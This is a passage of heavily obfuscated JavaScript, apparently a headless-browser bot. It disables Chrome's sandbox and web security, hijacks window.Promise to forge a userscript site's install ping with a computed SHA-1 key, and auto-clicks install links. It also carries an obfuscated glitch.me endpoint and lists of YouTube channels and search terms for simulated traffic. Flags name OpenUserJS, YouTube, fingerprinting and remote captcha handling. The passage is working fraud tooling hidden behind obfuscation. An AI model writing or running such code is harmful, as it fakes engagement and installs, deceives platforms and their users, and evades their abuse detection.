                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= -0x1ede + 0xbe7 * 0x2 + -0xd * -0x90 ? (this['block'] = P[-0x21d2 + 0x2 * -0xca9 + 0x3b34], this['start'] = N - (-0x1 * 0x3f3 + 0x11a7 + -0xd74), this['hash'](), this['hashed'] = -0x2070 * -0x1 + 0x2 * -0x193 + 0x93 * -0x33) : this['start'] = N;
                }
                return this['bytes'] > 0x110730787 + 0x4714d548 + -0x5787dcd0 && (this['hBytes'] += this['bytes'] / (0x40 * 0x5840c5b + 0x2 * 0xbf8afa78 + -0x1e0190bb0) << -0x16d4 + 0x1 * 0x9a1 + -0x1f * -0x6d, this['bytes'] = this['bytes'] % (0xcddf5 * -0x15f4 + 0xfc9dd3c + 0x20aaec948)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = -0x1 * -0x76b + 0x1a55 + 0x21bf * -0x1;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x143e + -0x1 * 0x1981 + -0x553 * -0x1] = this['block'], J[K >> -0x2467 * -0x1 + -0x907 * 0x4 + -0x1 * 0x49] |= x[-0x148f + -0x208 + 0x169a & K], this['block'] = J[0x83c + 0xaf + -0x8db * 0x1], K >= 0x56 * -0x64 + 0xdb * 0xc + 0x178c && (this['hashed'] || this['hash'](), J[0x2 * -0x4f6 + 0x6 * -0x40b + 0x222e] = this['block'], J[0x8ea + 0x7 * 0xb + -0x47 * 0x21] = J[0x5 * -0x31c + 0x1625 + -0x1 * 0x698] = J[0x23 * 0x4f + 0x199 * -0x4 + -0x1 * 0x467] = J[0xe19 + -0x4af * -0x7 + -0x2edf] = J[0x11c3 * -0x1 + -0x1a * -0x115 + -0xa5b] = J[0x21 * -0x23 + -0x2d * 0xb3 + 0x23ff] = J[0xd6c * -0x2 + 0x4 * -0x4b4 + 0x16d7 * 0x2] = J[-0x6 * 0x222 + 0x25c4 + -0x5 * 0x4fd] = J[0x1 * 0x1a41 + -0x2 * 0x11f1 + -0x1 * -0x9a9] = J[-0x1 * 0x1ff8 + 0xea3 + 0x115e] = J[0x18 * 0x39 + -0x66d + 0x11f] = J[-0x9a * -0x34 + 0x20f * -0x1 + -0x1d2e] = J[-0x193d + 0x1fa9 + -0x660] = J[-0x1b76 + -0x15ea + 0x1 * 0x316d] = J[0x1357 + 0x81 * 0xd + -0x19d6] = J[0x1616 + -0x382 * 0x2 + -0xf03] = -0x18ad * -0x1 + 0x173 + -0xb * 0x260), J[-0x1 * 0x58a + 0x18bd + -0x1325 * 0x1] = this['hBytes'] << 0xf82 + 0x11a2 + -0x2121 | this['bytes'] >>> -0x1d2c * -0x1 + 0xa56 + 0x2765 * -0x1, J[-0x516 * 0x2 + 0x6f3 + 0x348] = this['bytes'] << 0x1c01 + 0x565 * -0x2 + -0x1134, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = 0x2 * 0x685 + -0xa6a + -0x290; J < 0x15b3 + -0x1408 + -0x15b; ++J)
                K = Q[J - (0x1971 + -0xa6f + -0xeff)] ^ Q[J - (0x908 * 0x4 + -0xd2 * 0x27 + -0x41a)] ^ Q[J - (-0x45 * 0x86 + 0x2 * 0x3b + 0x23b6)] ^ Q[J - (0x726 + -0x1 * 0x1f93 + 0x187d)], Q[J] = K << -0x1e86 + -0x1 * -0xc93 + 0x5fc * 0x3 | K >>> -0x1fbf + 0x1d39 + 0x1 * 0x2a5;
              for (J = -0x1f9 * 0x8 + -0x1 * 0x44f + 0x1417; J < 0x1e * 0x21 + -0x1b5e + 0x4 * 0x5e5; J += 0x22b9 + -0xc38 + -0x59f * 0x4)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1043 + -0xa5d * 0x1 + -0x1 * -0x1aa5 | L >>> -0x2074 + 0x2e0 + 0x3 * 0x9e5) + (M & N | ~M & O) + P + (-0x155847 * -0x2dd + -0x199f * -0x4893c + -0x239056 * 0x271) + Q[J] << 0x103d * -0x2 + 0x9c7 + 0x16b3) << -0x1c19 + 0x51a + 0x1704 | P >>> -0xd * 0xf5 + -0x2349 + 0x2fd5) + (L & (M = M << -0x1826 + -0x1 * 0x1447 + 0x2c8b | M >>> 0x7 * -0x386 + 0x344 + -0x28 * -0x89) | ~L & N) + O + (0x426673d3 + -0x7b06a1cf + -0x97 * -0xf972b3) + Q[J + (-0x68b + 0xb10 + -0x484)] << 0x5f * -0x63 + -0x6 * 0x375 + 0x397b) << 0x5 * -0x4df + 0x12a4 + -0x5bc * -0x1 | O >>> 0xa0 * -0x3 + 0x22a + -0x2f) + (P & (L = L << 0x11 * -0x223 + -0x3 * 0x382 + 0xb * 0x445 | L >>> 0x4 * 0x943 + -0x6a * -0xa + -0x292e) | ~P & M) + N + (-0x6c72 * 0x12ca6 + 0x9c9e557c + 0x6d * 0x8fda8d) + Q[J + (-0x17af + 0x122d + 0x584)] << -0xe86 + 0x2e * -0x27 + -0xd * -0x1a8) << 0x2 * -0xecd + -0xf35 + 0x2cd4 | N >>> 0x1 * 0x107b + -0x1e3e + -0x5 * -0x2c6) + (O & (P = P << 0x4a * 0x82 + -0x1f6d * 0x1 + -0x609 | P >>> 0x1a00 + 0x182b + -0x3229) | ~O & L) + M + (0x6 * 0x5915a04 + -0x427b46b2 + 0x7b95a433) + Q[J + (0x1 * 0xbcb + -0x197a + -0x2 * -0x6d9)] << -0x2291 + 0x1 * 0xad6 + 0x17bb) << 0x1150 + 0x123b + -0x2386 | M >>> 0x578 * -0x6 + 0x1041 + 0x10aa) + (N & (O = O << 0x1cb0 + -0x1ccc + 0x3a | O >>> 0x11 * -0x107 + 0xad * -0x22 + 0x2873) | ~N & P) + L + (-0x6 * -0xe2bf84e + 0x2 * 0xf09812f + -0x18985a99) + Q[J + (0x12 * 0x1f + -0x1cbb + 0x1a91)] << -0x7d * -0x13 + 0x45b * -0x5 + 0xc80 * 0x1, N = N << -0x4 * -0xf + -0x1 * 0x9d + -0x7f * -0x1 | N >>> -0x1633 + -0x260a + 0x3c3f;
              for (; J < -0xabc * -0x3 + -0x82c + -0x17e0; J += 0x11 * 0x13c + 0xcb0 + -0x21a7)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x8be * -0x2 + -0x2 * -0xd3d + 0x647 * -0x7 | L >>> 0x1bb9 + -0x53b * -0x2 + 0x985 * -0x4) + (M ^ N ^ O) + P + (-0x521bb821 * -0x1 + 0x8126cb2f + -0x19 * 0x4042f07) + Q[J] << 0x211b + -0x1dc8 + -0x353) << -0x185 + -0x3b2 * 0x5 + 0x1404 | P >>> 0x11d1 * -0x1 + -0x1df3 * 0x1 + 0x2fdf) + (L ^ (M = M << -0x2a4 * 0x5 + -0x1fed * -0x1 + -0x1 * 0x129b | M >>> 0xbba + -0x1733 + -0xb7b * -0x1) ^ N) + O + (-0x12 * 0x1bb396c + -0x50337c8c + 0xde3771c5) + Q[J + (0x794 + -0x237d + 0x1bea)] << -0x2200 + -0x40 * 0x17 + 0x27c0) << -0x3b * 0x80 + -0x108c + 0x2e11 | O >>> 0x633 + -0x145 * -0x1a + 0x3e9 * -0xa) + (P ^ (L = L << 0x13f1 + 0x233d + -0x3710 | L >>> 0x2 * 0x33f + -0x150e + 0xa * 0x175) ^ M) + N + (0x6000891b + 0x65a65c4e + 0x15a * -0x4038f4) + Q[J + (0x1 * -0x8a1 + 0x261b + 0xa4 * -0x2e)] << 0xeb4 * -0x1 + 0x287 + 0xc2d) << 0x1b0d + 0x1a * -0x53 + -0x129a | N >>> -0x2427 + -0xda4 + 0x31e6) + (O ^ (P = P << 0xc3a + -0x3 * -0x99b + -0x28ed | P >>> 0xff3 * -0x2 + 0x2554 * 0x1 + -0x4 * 0x15b) ^ L) + M + (0x74d3cf53 + 0x2404e47e + -0x29fec830) + Q[J + (0x213b + -0x1037 * 0x1 + -0x1101 * 0x1)] << -0x499 * -0x1 + -0x2 * -0x1277 + -0x2987) << -0x1cb + -0x7c5 * 0x3 + 0x191f | M >>> 0x23c0 + 0x1eab * -0x1 + -0x4fa) + (N ^ (O = O << 0x126a * 0x1 + 0x104a + -0x2296 | O >>> 0x232 * -0x2 + -0x24a4 + -0xce * -0x33) ^ P) + L + (-0x73919677 + -0xd97bf110 + 0x1bbe77328) + Q[J + (0x2001 + -0x257f + 0x1 * 0x582)] << 0x16b8 + 0x2 * 0xa67 + -0x2b86, N = N << 0x118d + 0x1 * -0xaed + -0x682 | N >>> 0x36a * 0xb + 0x4 * -0x3b + 0x2 * -0x1250;
              for (; J < -0x19 * -0x16b + -0x2 * -0x46 + -0x23c3; J += 0x7e7 + 0x4 * 0x493 + -0x6 * 0x45d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x278 + 0x26 * -0x9b + 0x197f | L >>> 0x1d55 + 0x11b4 + -0x2eee) + (M & N | M & O | N & O) + P - (0xcc4b53eb + 0x1355342 * 0x2b + 0x3 * -0x2fc9599f) + Q[J] << 0x1f * 0x139 + -0x2128 * -0x1 + 0x470f * -0x1) << 0xc4e + -0x5a6 * -0x2 + 0x1795 * -0x1 | P >>> 0x606 + 0xdfa + -0x13e5) + (L & (M = M << 0xc + -0x20a + 0x21c | M >>> -0x3b * -0x6 + -0x2 * -0x134f + 0x1 * -0x27fe) | L & N | M & N) + O - (0x1871b * 0x3d2a + 0x10d6f051 * 0xb + 0xa5c9a9c5 * -0x1) + Q[J + (0x25ec + -0x1773 + -0x39e * 0x4)] << -0x6cb * -0x5 + 0x986 + -0x2b7d) << 0xd * 0x8b + 0x1 * 0x1968 + -0x2 * 0x1039 | O >>> 0xcdf + 0x1dde + -0x2 * 0x1551) + (P & (L = L << 0x2f * -0x7a + 0x710 + 0x4 * 0x3dd | L >>> -0x1 * 0x22c7 + -0x5d5 + -0x1 * -0x289e) | P & M | L & M) + N - (0x42f233e9 * -0x2 + 0x1 * 0x98d41233 + 0x5df498c3) + Q[J + (-0x6f6 + -0x9 * 0x34b + 0x249b)] << -0x24 * -0x36 + 0x15f3 + 0x1d8b * -0x1) << 0x5 * 0x52d + 0x1 * 0x17d5 + -0x31b1 * 0x1 | N >>> 0x85d * 0x4 + 0xbba + 0x419 * -0xb) + (O & (P = P << 0x1dfc + -0x81 * 0x22 + -0x65e * 0x2 | P >>> 0x1cf * 0x1 + 0x1 * -0x23ea + 0x1 * 0x221d) | O & L | P & L) + M - (-0xbdb3d382 * -0x1 + 0x2360bca6 + -0x70304d04) + Q[J + (-0x1 * 0x1d11 + -0x1e79 + 0x3b8d)] << -0x1826 + -0x23 * -0x1f + 0x13e9) << -0x1 * -0x277 + -0x1bb9 * -0x1 + 0x1e2b * -0x1 | M >>> 0x1572 + -0x110a + -0x44d * 0x1) + (N & (O = O << -0x103 * -0x6 + 0x85e + -0xe52 | O >>> -0x1e92 + 0x2352 + -0x4be) | N & P | O & P) + L - (0xdd13812d + 0x77c3b643 * -0x1 + 0xb94783a) + Q[J + (0x2405 + 0x1d95 + -0x4196)] << -0x2380 + 0x3 * 0x757 + 0x11 * 0xcb, N = N << 0xcaf * -0x2 + 0xf * 0x13a + 0x1 * 0x716 | N >>> 0x2b * -0x68 + -0x2512 + -0x4 * -0xda3;
              for (; J < -0x1378 + -0x16af * 0x1 + 0x2a77; J += -0x141d + -0xb56 + 0x1f78)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x10eb * 0x2 + 0x5d * -0x1d + -0x1748 | L >>> 0x1219 * 0x1 + 0xcac + 0xa * -0x311) + (M ^ N ^ O) + P - (-0x69312437 + 0x7d8f16e + 0x96f570f3) + Q[J] << 0x1 * -0x10c6 + -0x2522 + 0x19 * 0x228) << -0x836 * 0x4 + -0x11 * 0xca + -0xb * -0x435 | P >>> -0x2e9 * 0xb + 0x1 * 0x13ab + 0xc73) + (L ^ (M = M << -0x10d6 + -0x67 * -0x47 + -0x1 * 0xb9d | M >>> 0x217 * -0xd + -0x2328 + 0x3e55) ^ N) + O - (0x5de4ee96 + -0xa91db * -0x9e6 + -0x6 * 0x1826925d) + Q[J + (-0x1454 + -0x24e + 0x5 * 0x487)] << 0x2 * 0x506 + 0x1 * -0x183b + 0xe2f) << 0x1 * -0x955 + 0x307 + 0x653 | O >>> 0x9 * 0x11 + -0xb4f * 0x2 + 0x1620) + (P ^ (L = L << 0x934 + -0x1546 + -0x30 * -0x41 | L >>> 0x1c8b + 0x1 * 0x1a7b + -0x3704) ^ M) + N - (-0x1961fe21 + -0xcd67c26 * -0x4 + -0xa49699 * -0x2b) + Q[J + (0x1d19 + -0x1 * 0x9ca + 0x1b * -0xb7)] << -0x52 * -0x13 + -0x3 * 0x41b + 0x63b) << -0x675 + -0xb * -0x107 + 0x5f * -0xd | N >>> -0x1 * -0x529 + 0x1d72 + -0x2280) + (O ^ (P = P << 0x25e2 + -0x173d * 0x1 + -0xe87 * 0x1 | P >>> -0x115 * 0x1 + -0x5 * -0x107 + -0xe * 0x4a) ^ L) + M - (0x482bf63b + -0x598133 * -0x53 + 0x23ce * -0x1542b) + Q[J + (0x7e3 * -0x3 + 0x13b0 + 0x3fc)] << 0x264c + 0x170 + -0x27bc * 0x1) << 0x23a9 + -0x23e0 + 0x3c | M >>> -0x139f * -0x1 + 0x33 * 0x84 + -0x2dd0) + (N ^ (O = O << -0x10ca + -0x16c1 + -0x27a9 * -0x1 | O >>> 0x2 * -0x33d + -0x2448 + 0x2ac4) ^ P) + L - (-0x678b41f1 + 0x147b7 * -0x3f8e + 0xee84509d) + Q[J + (-0x67c + -0x146a + 0x1aea)] << -0x26e8 + -0x79 + 0x2761, N = N << -0x1 * -0x8eb + -0xaea + -0x21d * -0x1 | N >>> -0x11f4 + 0x2 * -0x12df + -0x592 * -0xa;
              this['h0'] = this['h0'] + L << -0x193c * -0x1 + -0x18cd + -0x6f, this['h1'] = this['h1'] + M << -0x233 * -0x9 + -0x10fa + -0x2d1, this['h2'] = this['h2'] + N << -0x5bc * 0x4 + -0x614 + 0x9ac * 0x3, this['h3'] = this['h3'] + O << 0x24c9 + 0xd7b + -0x4 * 0xc91, this['h4'] = this['h4'] + P << -0x11 * -0x3c + -0x1 * -0x1dcd + -0x21c9;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0xfb * -0x25 + 0xc2e + -0x1 * 0x3059 & 0xecf * 0x2 + 0x1193 + 0x2f22 * -0x1] + w[J >> 0x2 * 0x10fd + 0x240 + -0xa * 0x39d & 0x1 * 0x6da + 0x1 * -0x869 + 0x19e] + w[J >> -0x6f7 * -0x1 + 0x1ab3 + 0x2 * -0x10cb & 0xb * 0x2bd + 0xca5 + 0x349 * -0xd] + w[J >> -0x2 * 0x10c3 + -0x75b + 0xdf * 0x2f & -0x1 * -0x25b6 + -0x885 * -0x1 + -0x1e * 0x18a] + w[J >> 0xdf2 + 0x1 * 0xa33 + -0x1819 & -0x2269 + -0x1ea4 + 0x411c] + w[J >> 0x9c1 + -0x1b40 + 0x1187 & -0x8bc + 0x2491 + -0x1bc6] + w[J >> -0x1 * 0x17c1 + -0xb * 0x29f + 0x349a & 0x108f + -0x1 * 0xa5e + 0x1 * -0x622] + w[0x25 * 0x57 + 0x241b + -0x309f & J] + w[K >> 0x1544 + -0x2216 * -0x1 + -0x373e & 0xeb4 + 0x11d * 0x1f + -0x23c * 0x16] + w[K >> 0x1 * -0xc5f + -0x1 * -0xc5b + 0x1c & -0x9c2 + 0x1257 + -0x886 * 0x1] + w[K >> 0x1fb9 * -0x1 + -0x333 * 0x2 + 0x2633 & 0x2 * -0xc2f + 0x1 * 0x1d6b + 0x8e * -0x9] + w[K >> 0x2597 * -0x1 + 0xd21 + 0x2 * 0xc43 & 0x2ed * 0x7 + -0x12b7 + -0x1b5 * 0x1] + w[K >> 0xb11 + -0x12bb + 0x2f * 0x2a & -0x313 * 0x1 + 0x177f + -0x145d] + w[K >> -0x3ff * -0x1 + -0x1 * -0xdc9 + -0x40 * 0x47 & 0xf + -0x6d0 + 0x6d0] + w[K >> 0x4 * -0x669 + 0x17b7 * 0x1 + -0x1 * -0x1f1 & -0x2245 + -0x6 * -0x401 + 0xa4e] + w[-0x325 * -0x7 + 0x1fb6 + 0x1 * -0x35aa & K] + w[L >> 0x1a76 + -0x1 * 0x911 + 0x4b * -0x3b & 0x1d75 + -0x920 * 0x2 + -0xb26] + w[L >> 0x9 * 0x97 + 0x220a + 0x305 * -0xd & 0x1 * -0x246e + 0x182b + 0xc52] + w[L >> -0x1ffe + -0xf9 * -0x16 + 0x1 * 0xaac & 0xce8 + -0x1ed0 + 0x11f7] + w[L >> -0x73 * -0x56 + -0x1 * 0x15e8 + 0x2c7 * -0x6 & 0xad * 0x29 + -0x758 * 0x3 + -0x59e] + w[L >> 0x2 * -0x1223 + 0x2366 + 0xec & 0x1555 + 0x125d + -0x27a3] + w[L >> 0x2f + -0x1947 + -0xc * -0x218 & -0x6dc * 0x1 + -0x74c * -0x1 + -0x61] + w[L >> -0xfcc + 0x1 * -0x3a9 + 0x1379 & 0xa0 * -0x4 + -0x4ae + 0x73d] + w[-0x25a9 + -0xc19 * -0x1 + 0x3a9 * 0x7 & L] + w[M >> -0x116c + 0x1099 + 0xef & -0x1a46 + -0x3f1 * -0x4 + 0x5 * 0x21d] + w[M >> 0x10cc + -0x1428 * -0x1 + -0x24dc & -0x1539 + 0x21f4 + -0xcac] + w[M >> -0x16 * -0x68 + -0x10f1 + -0x815 * -0x1 & -0xe * -0x236 + 0x1 * 0x208b + -0x3f70] + w[M >> -0xd3 * -0x5 + 0xf97 + 0x1f7 * -0xa & -0x1cbf * -0x1 + -0x3 * 0xa8d + -0xb * -0x45] + w[M >> -0x219f + 0xcd1 + -0x1 * -0x14da & -0x3 * 0x14 + -0x4dc * 0x1 + 0x527] + w[M >> 0x1797 + 0x1 * -0x959 + 0xd6 * -0x11 & -0x17f6 + -0x1409 + 0x2c0e] + w[M >> 0x76 * -0x4f + -0x222b + 0x4699 & -0x2658 + 0x25e5 * 0x1 + -0x1 * -0x82] + w[-0x1 * 0x20af + 0x123e + 0x8 * 0x1d0 & M] + w[N >> 0x2180 + -0xd * 0x4 + -0x2130 & 0x149a + 0x26f * 0x3 + 0x63 * -0x48] + w[N >> 0x18e0 * -0x1 + -0xafe * 0x1 + -0x2 * -0x11fb & -0x3 * 0x6d9 + -0x2f * 0x9d + 0x316d] + w[N >> 0x68f + -0x198d + 0x989 * 0x2 & 0x107 * 0x22 + -0x204d + -0x149 * 0x2] + w[N >> 0xcc * -0xa + -0x8d0 + 0x2c * 0x62 & -0x97e + 0x62 + 0x92b] + w[N >> 0x259 * -0xe + -0x10e8 * 0x2 + 0x27 * 0x1b6 & -0x1 * -0x12ad + -0x15e7 + 0x349 * 0x1] + w[N >> 0xabe + 0x15 * -0xe5 + -0x27 * -0x35 & -0xa8c + -0x1fc0 + -0x7 * -0x60d] + w[N >> -0x15f7 * 0x1 + -0x1a51 + -0x2 * -0x1826 & 0x4 * -0x272 + -0x18b9 + 0x2290] + w[0x2de * -0x4 + 0x151 * -0x2 + 0xe29 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0xd9b + 0x1c5e + -0xeab & -0x8b * 0x14 + -0x19bc + 0x2597,
                J >> -0x783 * 0x1 + -0x27 * -0x45 + -0x2f0 & -0xf9 * 0x4 + -0x11a8 + -0x168b * -0x1,
                J >> -0x11dd * 0x1 + 0xfb2 + 0x233 & 0x1c50 + 0x105 * 0xd + -0x482 * 0x9,
                -0x86a * 0x3 + -0x74 + 0x1 * 0x1ab1 & J,
                K >> -0x3 * -0x197 + -0x21ba + 0x1d0d & 0xa7b + 0x518 * 0x2 + -0x4 * 0x4eb,
                K >> 0x43b + -0xae0 + -0x1 * -0x6b5 & 0x11 * -0xbd + 0x1876 * -0x1 + 0x2602,
                K >> -0x2055 + -0xc * -0x297 + 0x149 & 0x8 * 0x1c5 + -0x29 * 0x8f + 0x9be * 0x1,
                -0x2151 + 0x25fa + 0x86 * -0x7 & K,
                L >> 0x1 * -0x2509 + -0x1 * -0x218c + 0x395 & -0x7 * -0x2dd + -0x2 * -0x538 + 0x4a * -0x66,
                L >> -0x936 + 0x8 * 0x130 + 0x3a * -0x1 & 0x9ca * -0x1 + 0x27 * -0x90 + -0x1 * -0x20b9,
                L >> 0x15 * 0xef + 0x3b * 0x32 + -0x1f19 & 0x1253 * 0x1 + -0x15ae + 0x22d * 0x2,
                0x1 * 0x1813 + 0xb * 0xc9 + -0x1fb7 * 0x1 & L,
                M >> 0x1 * -0xc86 + -0x1114 + -0x16a * -0x15 & 0x1 * -0xde7 + 0x7 * -0xf1 + 0x157d,
                M >> -0x2657 + -0x223 * 0x2 + -0x73 * -0x5f & 0x5ec + 0x854 + 0x1 * -0xd41,
                M >> 0x182b + -0x2010 + 0x7ed & 0xe88 + 0x21a4 + -0xd * 0x3a1,
                -0x1d69 + -0x1705 + -0x3 * -0x11cf & M,
                N >> 0xb8f + 0x9 * -0x403 + 0x18a4 & 0x955 + 0x12 * -0x12 + -0x712,
                N >> -0x130d + -0xe * 0x173 + -0x2767 * -0x1 & -0x2ed + -0x5db + 0x9c7,
                N >> 0x1 * 0x1239 + 0x1 * 0xc19 + 0xf25 * -0x2 & -0x18fa + -0xd * 0x107 + 0x2754,
                -0x26 * 0x68 + 0x2b * -0xd7 + 0x348c & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              const T = c;
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x1 * -0x1093 + -0x907 + -0x13 * -0x15a), (K = new DataView(J))['setUint32'](0x2083 + -0x26c7 + -0x2 * -0x322, this['h0']), K['setUint32'](-0x1 * -0x3cb + 0x7 * -0x25 + -0x2c4 * 0x1, this['h1']), K['setUint32'](0x1a5d + 0x2fa * 0x9 + -0x351f, this['h2']), K[T(0x10)](0x3 * 0x80e + -0xf8c + -0x892, this['h3']), K['setUint32'](0x303 * 0x5 + -0xb0e + -0x1 * 0x3f1, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x24cb + 0x1 * 0x220d + -0x2 * 0x236c];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0xc4c + -0x2217 + 0x15cb;
            J[0x55 + 0x1b93 + -0x1be8]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0xdd6 + 0x10fb + -0x17 * 0x157] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x846 + 0x7 * 0x2ab + -0x2 * 0xd79), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x10db * 0x1 + 0x1304 * 0x2 + -0x36e2;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x49c * 0x2 + -0x446 * -0x3 + -0x102e), Promise['resolve'](-0x47 + -0x87d + -0x1 * -0x8c5);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x83 * 0x41 + 0x2038 + -0x3 * -0x59; j < -0x1d72 * -0x1 + -0x914 + -0x145d; j++)
    i();
}
const NETWORK_PATIENCE = -0x2bfa + 0x1a9f + 0x309b + (-0x5f * -0x61 + 0x4 * -0x157 + -0x12eb) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x9 * 0x232 + 0x5c0 + -0x197f) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0xd67 * -0x1 + 0x29 * 0x11 + -0x1020; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + U(0xe, 'M@IC'))['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 